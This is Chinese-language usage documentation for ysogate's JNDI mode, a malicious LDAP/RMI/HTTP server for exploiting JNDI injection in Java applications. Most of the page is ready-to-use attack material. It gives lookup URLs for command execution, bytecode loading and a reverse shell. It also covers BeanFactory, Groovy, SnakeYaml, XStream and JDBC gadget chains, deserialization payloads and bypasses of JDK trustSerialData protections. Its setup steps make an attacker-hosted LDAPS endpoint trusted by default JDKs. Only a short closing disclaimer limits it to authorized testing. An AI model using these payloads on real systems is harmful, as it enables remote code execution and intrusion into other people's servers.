# JNDI Mode

JNDI Mode用于启动本地恶意JNDI服务器，支持LDAP、RMI和HTTP服务。该模式支持多种绕过技术和利用方式，适用于安全测试和漏洞研究。

## 基本用法

```bash
java -jar ysogate-[version]-all.jar -m jndi [OPTIONS]
```

## 命令行选项

```bash
[root]#~  JNDI Mode Options:
 -h,--help              Show help message
 -hp,--httpPort <arg>   HTTP port
 -i,--ip <arg>          IP address for JNDI server
 -ks,--keystore <arg>   JKS file for LDAPS
 -kp,--storepass <arg>  JKS password
 -ldap2rmi              bypass trustSerialData
 -lp,--ldapPort <arg>   LDAP port
 -lsp,--ldapsPort <arg> LDAPS port
 -m,--mode <arg>        Operation mode: 'payload' or 'jndi' or 'gen'
 -onlyRef               bypass trustSerialData
 -path <arg>            Fixed route path for all requests
 -rp,--rmiPort <arg>    RMI port
```

## 使用示例

### 基本用法

启动JNDI服务器：

```bash
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
```

指定端口启动：

```bash
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -rp 1099 -lp 1389 -hp 8080
```

### 固定路径模式

使用 `-path` 参数可以让所有 LDAP/RMI 请求（无论客户端请求的路径是什么）都路由到指定路径的处理逻辑。适用于无法控制客户端 JNDI lookup 路径的场景。

```bash
# 所有请求都返回 DNSLog 探测结果
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Basic/DNSLog/xxx.dnslog.cn

# 所有请求都执行命令
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Basic/Command/calc

# 所有请求都返回反序列化 payload
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Deserialize/Jackson2/Command/calc
```

例如以上启动后，无论客户端请求 `ldap://127.0.0.1:1389/` 还是 `ldap://127.0.0.1:1389/anything`，服务端都会返回 `-path` 指定路径对应的结果。

## trustSerialData 绕过

在JDK20+版本中`com.sun.jndi.ldap.object.trustSerialData`属性默认为`false`，无法在com.sun.jndi.ldap.Obj#decodeObject中反序列化，绕过方式主要有：

### ldap2rmi

通过设置javaRemoteLocation来使用com.sun.jndi.ldap.Obj#decodeRmiObject还原Factory对象，从ldap转换成rmi进行绕过。

可以在启动时添加`-ldap2rmi`来进行可能的绕过，例如：

```bash
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -ldap2rmi
```

### onlyRef

利用本地Factory进行攻击时，可以通过设置`objectClass`为`javaNamingReference`来避免进行反序列化，利用decodeReference来还原Factory对象，不适用于BeanFactory绕过，因为BeanFactory需要ResourceRef类型。

可以在启动时添加`-onlyRef`来进行可能的绕过，例如：

```bash
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
```

## 利用方式

### codebase 注入

LDAP和RMI通用，通过 JNDI Reference 指定codebase，远程加载ObjectFactory，需要trustURLCodebase=true。

```bash
# 参数支持urlsafe base64
ldap://127.0.0.1:1389/Basic/xxxxxxx/Y2FsYw==

# 执行命令
ldap://127.0.0.1:1389/Basic/Command/calc

# Dnslog
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn

# 加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/data:yv66vxxxxxxxxxxxxx

# 从/tmp/a.class加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/file:L3RtcC9hLmNsYXNz

# 加载内存马(todo)
ldap://127.0.0.1:1389/Basic/Custom/mem:Tomcat

# 原生反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
```

### 基于 BeanFactory

BeanFactory这个类在tomcat8+或者SpringBoot 1.2.x+存在，且要求tomcat版本小于9.0.63，或小于8.5.79。

#### Tomcat ELProcessor

利用javax.el.ELProcessor#eval

```bash
# 使用方式同Basic

# 使用el调用ScriptEngineManager来加载字节码(nashorn在JDK15后被移除)
ldap://127.0.0.1:1389/ELProcessor/Command/calc
ldap://127.0.0.1:1389/ELProcessor/Custom/data:yv66vxxxxxxxxxxxxx

# jdk9以上可以用el调用JShell来加载字节码
ldap://127.0.0.1:1389/ELProcessor17/Command/calc
```

#### GroovyShell & GroovyClassLoader

利用groovy.lang.GroovyShell#evaluate和groovy.lang.GroovyClassLoader#parseClass(java.lang.String)

```bash
# 使用方式同Basic
ldap://127.0.0.1:1389/GroovyClassLoader/Command/calc
ldap://127.0.0.1:1389/GroovyShell/Command/calc
```

#### SnakeYaml

利用org.yaml.snakeyaml.Yaml#load(java.lang.String)

```bash
# 使用方式同Basic
ldap://127.0.0.1:1389/SnakeYaml/Command/calc
```

#### XStream

利用com.thoughtworks.xstream.XStream#fromXML(java.net.URL)，可以打CVE-2021-39149，要求XStream < 1.4.18

```bash
# 暂时只写了执行命令
ldap://127.0.0.1:1389/XStream/calc
```

#### MLet

通过 MLet 探测 classpath 中存在的类

```bash
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求

#### NativeLibLoader

利用com.sun.glass.utils.NativeLibLoader#loadLibrary加载目标服务器上的动态链接库，适用于能够写文件的场景。

写入dll/so/dylib文件，例如/tmp/evil.so，使用时把路径去掉后缀， 即/tmp/evil

```bash
ldap://127.0.0.1:1389/NativeLibLoader/L3RtcC9ldmls
```

#### JSVGCanvas

高版本tomcat下通过GenericNamingResourcesFactory来调用setter，触发 org.apache.batik.swing.JSVGCanvas#setURI，需要TomcatJDBC，batik-swing 1.15以下，适用于高版本TomcatBypass

```bash
ldap://127.0.0.1:1389/JSVGCanvas/Command/calc
```

### JDBC RCE

支持以下数据库连接池：
- Commons DBCP
- Tomcat DBCP
- Tomcat JDBC
- Alibaba Druid
- HikariCP
- C3P0

支持以下数据库：
- Mysql
- PostgreSQL
- H2
- IBM DB2
- Derby
- Teradata

```bash
ldap://127.0.0.1:1389/TomcatJDBC/H2/Java/Command/calc
```

### 反序列化

通过反序列化来进行RCE，暂不支持rmi协议

```bash
# 执行命令
ldap://127.0.0.1:1389/Deserialize/{gadget}/Command/{cmd}

# 加载自定义字节码（部分需要继承AbstractTranslet）
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/data:yv66vxxxxxxxxxxxxx

# 从/tmp/a.class加载自定义字节码（部分需要继承AbstractTranslet）
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/file:L3RtcC9hLmNsYXNz

# 加载内存马(todo)
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/mem:Tomcat

# example
ldap://127.0.0.1:1389/Deserialize/Jackson2/Command/calc
```

## LDAPS 支持

ysogate 同时监听 LDAP（明文）和 LDAPS（SSL/TLS）端口，默认端口 1389 / 1636。

### 方式一：内置 LDAPS（JKS 证书）

适用于拥有域名 + Let's Encrypt 证书的场景。

```bash
# 1. 申请 Let's Encrypt 证书
certbot certonly --standalone -d evil.example.com

# 2. 转换为 JKS 格式
openssl pkcs12 -export \
  -in /etc/letsencrypt/live/evil.example.com/fullchain.pem \
  -inkey /etc/letsencrypt/live/evil.example.com/privkey.pem \
  -out cert.p12 -name ldaps -passout pass:changeit

keytool -importkeystore \
  -srckeystore cert.p12 -srcstoretype PKCS12 -srcstorepass changeit \
  -destkeystore ldaps.jks -deststoretype JKS -deststorepass changeit

# 3. 启动（客户端默认 JDK 即可信任）
java -jar ysogate.jar -m jndi -i evil.example.com -ks ldaps.jks -kp changeit
```

不指定 `-ks` 时使用自签名证书（客户端需手动信任）：

```bash
java -jar ysogate.jar -m jndi -i 0.0.0.0
```

### 方式二：TLS 反向代理（推荐，仅有 IP 时可用）

参考 [phith0n 的方案](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)，使用 nginx/socat 在前端处理 TLS，后端转发到明文 LDAP。

**优势**：ysogate 无需配置证书，只需明文 LDAP；TLS 证书由代理处理。

#### 使用 sslip.io 获取受信证书（仅有 IP）

sslip.io 是免费泛域名服务，`1-2-3-4.sslip.io` 自动解析到 `1.2.3.4`。

```bash
# 1. 用 certbot 为 sslip.io 子域名申请证书
certbot certonly --standalone -d 1-2-3-4.sslip.io

# 2. 启动 ysogate 明文 LDAP
java -jar ysogate.jar -m jndi -i 1.2.3.4

# 3. 用 socat 做 TLS 代理（636 -> 1389）
socat OPENSSL-LISTEN:636,cert=/etc/letsencrypt/live/1-2-3-4.sslip.io/fullchain.pem,key=/etc/letsencrypt/live/1-2-3-4.sslip.io/privkey.pem,verify=0,reuseaddr,fork TCP:127.0.0.1:1389
```

或使用 nginx stream 模块：

```nginx
stream {
    upstream ldap_backend {
        server 127.0.0.1:1389;
    }
    server {
        listen 636 ssl;
        ssl_certificate /etc/letsencrypt/live/1-2-3-4.sslip.io/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/1-2-3-4.sslip.io/privkey.pem;
        proxy_pass ldap_backend;
    }
}
```

客户端使用（默认 JDK，零配置）：

```java
ctx.lookup("ldaps://1-2-3-4.sslip.io:636/Deserialize/CB2183NOCC/Command/calc");
```

## 参数说明

- `-i, --ip`: 指定JNDI服务器监听的IP地址
- `-rp, --rmiPort`: 指定RMI服务端口
- `-lp, --ldapPort`: 指定LDAP服务端口
- `-lsp, --ldapsPort`: 指定LDAPS服务端口
- `-ks, --keystore`: 指定JKS证书文件路径
- `-kp, --storepass`: 指定JKS证书密码（默认changeit）
- `-hp, --httpPort`: 指定HTTP服务端口
- `-ldap2rmi`: 使用ldap到rmi的绕过方式
- `-onlyRef`: 仅使用Reference绕过方式
- `-path`: 固定路径模式，所有请求都路由到指定路径（如 `/Basic/DNSLog/xxx.dnslog.cn`）
- `-h, --help`: 显示帮助信息

## 安全使用说明

⚠️ **重要提醒**：本工具仅面向**合法授权**的安全测试使用，请勿用于非法目的。

使用本工具进行安全测试时，请确保：
1. 已获得目标系统的明确授权
2. 仅在授权范围内进行测试
3. 遵守相关法律法规